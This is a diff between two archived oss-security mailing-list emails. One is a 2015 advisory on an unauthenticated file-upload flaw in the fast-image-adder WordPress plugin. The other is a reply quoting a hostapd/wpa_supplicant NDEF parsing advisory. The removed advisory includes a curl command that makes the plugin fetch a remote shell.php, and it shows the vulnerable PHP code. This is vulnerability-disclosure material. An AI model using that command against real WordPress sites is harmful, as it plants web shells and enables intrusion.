@@ -1,9 +1,9 @@
-X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["1923" "Thursday" "16" "July" "2015" "21:51:20" "-0400" "Larry W. Cashdollar" "larry0@me.com" "<450DDE72-8853-4E64-B50C-285C5497776E@me.com>" "48" "[oss-security] Remote file upload vulnerability in fast-image-adder v1.1 Wordpress plugin" nil nil nil "7" "2015071701:51:20" "[oss-security] Remote file upload vulnerability in fast-image-adder v1.1 Wordpress plugin" (number mark "U       larry0@me.co Jul 16   48/1923  " thread-indent "\"[oss-security] Remote file upload vulnerability in fast-image-adder v1.1 Wordpress plugin\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["4202" "Sunday" "16" "August" "2015" "15:19:53" "+0200" "Moritz Muehlenhoff" "jmm@debian.org" "<20150816131953.GA32445@pisco.westfalen.local>" "99" "Re: [oss-security] hostapd/wpa_supplicant - Incomplete WPS and P2P NFC NDEF record payload length validation" nil nil nil "8" "2015081613:19:53" "[oss-security] hostapd/wpa_supplicant - Incomplete WPS and P2P NFC NDEF record payload length validation" (number mark "        jmm@debian.o Aug 16   99/4202  " thread-indent "\"Re: [oss-security] hostapd/wpa_supplicant - Incomplete WPS and P2P NFC NDEF record payload length validation\"\n") "<20150708144853.GE10457@w1.fi>" ("<20150708144853.GE10457@w1.fi>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
-X-Mozilla-Status: 0000
+X-Mozilla-Status: 0001
 X-Mozilla-Status2: 00000000
-Received: (qmail 14332 invoked by uid 550); 17 Jul 2015 01:51:48 -0000
+Received: (qmail 9287 invoked by uid 550); 16 Aug 2015 13:20:06 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,70 +11,121 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
+Received: (qmail 9266 invoked from network); 16 Aug 2015 13:20:05 -0000
+Message-ID: <20150816131953.GA32445@pisco.westfalen.local>
+References: <20150708144853.GE10457@w1.fi>
+MIME-Version: 1.0
+Content-Type: text/plain; charset=us-ascii
+Content-Disposition: inline
+In-Reply-To: <20150708144853.GE10457@w1.fi>
+User-Agent: Mutt/1.5.23 (2014-03-12)
+X-SA-Exim-Connect-IP: 141.70.75.12
+X-SA-Exim-Mail-From: jmm@inutil.org
+X-SA-Exim-Scanned: No (on inutil.org); SAEximRunCond expanded to false
+Cc: cve-assign@mitre.org
+Date: Sun, 16 Aug 2015 15:19:53 +0200
+From: Moritz Muehlenhoff <jmm@debian.org>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 14289 invoked from network); 17 Jul 2015 01:51:40 -0000
-X-Proofpoint-Virus-Version: vendor=fsecure
- engine=2.50.10432:5.14.151,1.0.33,0.0.0000
- definitions=2015-07-17_01:2015-07-17,2015-07-16,1970-01-01 signatures=0
-X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0
- suspectscore=0 phishscore=0 adultscore=0 bulkscore=0 classifier=spam adjust=0
- reason=mlx scancount=1 engine=7.0.1-1412110000 definitions=main-1507170020
-From: "Larry W. Cashdollar" <larry0@me.com>
-Content-type: text/plain; charset=utf-8
-Content-transfer-encoding: quoted-printable
-Message-id: <450DDE72-8853-4E64-B50C-285C5497776E@me.com>
-Date: Thu, 16 Jul 2015 21:51:20 -0400
-To: Open Source Security <oss-security@lists.openwall.com>
-MIME-version: 1.0 (Mac OS X Mail 8.2 \(2098\))
-X-Mailer: Apple Mail (2.2098)
-Subject: [oss-security] Remote file upload vulnerability in fast-image-adder v1.1 Wordpress
- plugin
+Subject: Re: [oss-security] hostapd/wpa_supplicant - Incomplete WPS and P2P
+ NFC NDEF record payload length validation
+To: oss-security@lists.openwall.com
 
-Title: Remote file upload vulnerability in fast-image-adder v1.1 Wordpress =
-plugin
-Author: Larry W. Cashdollar, @_larry0
-Date: 2015-07-10
-Download Site: https://wordpress.org/plugins/fast-image-adder
-Vendor: https://profiles.wordpress.org/robbyslaughter/
-Vendor Notified: 2015-07-10, plugin silently pulled?
-Vendor Contact: plugins@wordpress.org
-Description: Add images to your blog posts from a URL in a flash. Skip the =
-download/upload steps and the slow WordPress dialog box.
-Vulnerability:
-The  fast-image-adder-uploader.php  file doesn't check if a user is authori=
-zed to upload files: It creates a random file name, but reports the name ba=
-ck to the user.
+Hi,
+This doesn't seem to have received a CVE assignment, explicitly
+adding cve-assign to CC.
 
- 60          $upload_dir =3D wp_upload_dir();
- 61          $path =3D $upload_dir['path'];
- 62          $new_filename =3D $suggested_name_filesystem . "_" . random_fi=
-lename() . substr($url,strrpos($url,"."));
- 63=20=20=20=20=20=20=20=20=20=20
- 64=20
- 65          // If we are not in test mode, get the file and resize it=20=
-=20=20=20=20=20=20=20=20
- 66          if ($test_mode =3D=3D=3D FALSE)
- 67          {
- 68            $image_data =3D file_get_contents($url);
- 69            file_put_contents($path . "/" . $new_filename,$image_data);
- 70            resize($path . "/" . $new_filename, $new_height, $new_width,=
- $val_maxwidth, $path . "/" . $new_filename);
- 71          }=20=20=20
- 72=20=20=20=20=20=20=20=20=20=20
- 73          $new_url =3D $upload_dir['url'] . "/" . $new_filename;
-=2E
-=2E
+Cheers,
+        Moritz
 
- 83          if ($test_mode =3D=3D=3D FALSE)
- 84          {
- 85            echo "Uploaded as " . $new_url;
- 86          }
-
-CVEID:
-OSVDB:
-Exploit Code:
-	=E2=80=A2 $ curl http://www.example.com/wp-content/plugins/fast-image-adde=
-r/fast-image-adder-uploader.php?confirm=3Durl&url=3Dhttp://192.168.0.2/shel=
-l.php
-	=E2=80=A2 Shell location is reported back to the user with random filename=
-.  The url site must not interpret php, but allow it for download.=
+On Wed, Jul 08, 2015 at 05:48:53PM +0300, Jouni Malinen wrote:
+> Incomplete WPS and P2P NFC NDEF record payload length validation
+> 
+> Published: July 8, 2015
+> The latest version available from: http://w1.fi/security/2015-5/
+> 
+> 
+> Vulnerability
+> 
+> A vulnerability was found in NDEF record parsing implementation in
+> hostapd and wpa_supplicant. This code is used when an NFC Tag or NFC
+> connection handover is used to trigger WPS or P2P operations. The parser
+> did include bounds checking for the NDEF record payload length, but due
+> to insufficient integer size, it was possible to trigger integer
+> overflow that would result in bypassing the validation step with some
+> malformed NDEF records.
+> 
+> This could result in denial of service due to hostapd/wpa_supplicant
+> process termination (buffer read overflow) or infinite loop. The issue
+> can be triggered only if the NFC stack on the device does not perform
+> required validation steps for received NFC messages before sending the
+> received message to hostapd/wpa_supplicant for processing.
+> 
+> It was possible for the 32-bit record->total_length value to end up
+> wrapping around due to integer overflow if the longer form of payload
+> length field is used and record->payload_length gets a value close to
+> 2^32. This could result in ndef_parse_record() accepting a too large
+> payload length value and the record type filter reading up to about 20
+> bytes beyond the end of the buffer and potentially killing the process.
+> This could also result in an attempt to allocate close to 2^32 bytes of
+> heap memory and if that were to succeed, a buffer read overflow of the
+> same length which would most likely result in the process termination.
+> In case of record->total_length ending up getting the value 0, there
+> would be no buffer read overflow, but record parsing would result in an
+> infinite loop in ndef_parse_records().
+> 
+> Any of these error cases could potentially be used for denial of service
+> attacks over NFC by using a malformed NDEF record on an NFC Tag or
+> sending them during NFC connection handover if the application providing
+> the NDEF message to hostapd/wpa_supplicant did no validation of the
+> received NDEF records. While such validation is likely done in the NFC
+> stack that needs to parse the NFC messages before further processing,
+> hostapd/wpa_supplicant should have (re)confirmed NDEF message validity
+> properly.
+> 
+> 
+> Vulnerable versions/configurations
+> 
+> hostapd v0.7.0-v2.4 with CONFIG_WPS_NFC=y in the build configuration
+> (hostapd/.config) and NFC NDEF records passed to hostapd by the NFC
+> stack without validation.
+> 
+> wpa_supplicant v0.7.0-v2.4 with CONFIG_WPS_NFC=y in the build
+> configuration (wpa_supplicant/.config) and NFC NDEF records passed to
+> wpa_supplicant by the NFC stack without validation.
+> 
+> Note: No NFC stack implementation has yet been identified with
+> capability to pass the malformed NDEF record to
+> hostapd/wpa_supplicant. As such, it is not known whether this issue can
+> be triggered in practice.
+> 
+> Alternatively to an actual NFC operation trigger, the malformed NDEF
+> records could be provided by other applications running on the same
+> device if access to the hostapd/wpa_supplicant control interface is
+> available to untrusted components or users.
+> 
+> 
+> Acknowledgments
+> 
+> Coverity Scan discovered parts of this issue (insecure data
+> handling/TAINTED_SCALAR) and was the trigger for further manual review
+> of the parsing routine.
+> 
+> 
+> Possible mitigation steps
+> 
+> - Merge the following commit and rebuild hostapd/wpa_supplicant:
+> 
+>   NFC: Fix payload length validation in NDEF record parser
+> 
+>   This patch is available from http://w1.fi/security/2015-5/
+> 
+> - Update to hostapd/wpa_supplicant v2.5 or newer, once available
+> 
+> - Remove CONFIG_WPS_NFC=y from build configuration
+> 
+> - Confirm that the NFC stack does sufficient validation of the received
+>   NDEF records before passing them to hostapd/wpa_supplicant
+> 
+> -- 
+> Jouni Malinen                                            PGP id EFC895FA
+> 
